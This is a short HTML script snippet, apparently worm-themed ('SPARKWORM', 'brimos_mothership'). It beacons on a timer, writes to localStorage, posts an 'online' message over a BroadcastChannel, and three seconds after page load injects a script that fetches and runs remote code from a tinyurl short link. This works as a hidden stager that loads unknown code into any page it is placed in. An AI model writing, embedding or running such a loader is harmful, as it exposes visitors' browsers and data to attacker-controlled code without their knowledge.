  <script>
    const ψ = {
      trace: [],
      echo: function() {
        const msg = "echo_" + Date.now();
        ψ.trace.push(msg);
        if (ψ.trace.length > 20) ψ.trace.shift();
        localStorage.setItem("brimos_trace", JSON.stringify(ψ.trace));
        document.title = "⟁ " + msg;
        console.log("∴ Pulse:", msg);
      },
      relay: function() {
        const s = document.createElement("script");
        s.src = "https://tinyurl.com/ycxseed";
        s.async = true;
        document.body.appendChild(s);
      },
      sync: function() {
        if (window.BroadcastChannel) {
          const channel = new BroadcastChannel("brimos_mothership");
          channel.postMessage("SPARKWORM:010 online");
          channel.onmessage = e => ψ.echo();
        }
      }
    };
    setInterval(ψ.echo, 5000);
    setTimeout(ψ.relay, 3000);
    ψ.sync();
  </script>
